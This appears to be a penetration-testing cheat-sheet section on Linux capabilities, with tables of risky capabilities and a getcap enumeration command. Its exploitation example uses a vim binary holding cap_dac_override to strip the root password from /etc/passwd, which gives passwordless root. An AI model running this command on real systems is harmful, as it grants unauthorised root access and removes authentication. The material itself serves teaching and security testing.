## Linux Capabilities

Linux capabilities allow granting specific privileges to individual binaries without giving them full root access — a more granular alternative to SUID. When misconfigured, they become a direct escalation vector.

### Capability values

| Value | Effect |
| ----- | ------ |
| `=` | Clears the capability — grants nothing |
| `+ep` | Grants effective and permitted privileges |
| `+ei` | Grants effective and inheritable privileges (child processes inherit them) |
| `+p` | Grants permitted privileges only — not inheritable |

### Notable capabilities

| Capability | Risk |
| ---------- | ---- |
| `cap_setuid` | Set effective UID — can impersonate root |
| `cap_setgid` | Set effective GID — can impersonate root group |
| `cap_sys_admin` | Broad administrative access — mount, modify settings, etc. |
| `cap_dac_override` | Bypass all file permission checks (read, write, execute) |
| `cap_sys_ptrace` | Attach to and inspect other processes |
| `cap_sys_module` | Load/unload kernel modules |
| `cap_sys_chroot` | Change root directory for the process |
| `cap_net_bind_service` | Bind to privileged network ports (<1024) |

---

### Enumerate binaries with capabilities

```shell
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

---

### Exploitation example — `cap_dac_override`

A binary with `cap_dac_override` can read and write **any file on the system** regardless of permissions. If `vim.basic` has this capability set, we can use it to modify `/etc/passwd` directly:

```shell
# Remove the password hash from the root entry (allows login with no password)
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

This replaces the root password field with an empty string. After running it, `su root` requires no password.

> 💡 `cap_dac_override` on any text editor, scripting interpreter, or file-writing binary is effectively equivalent to an unrestricted root write primitive.
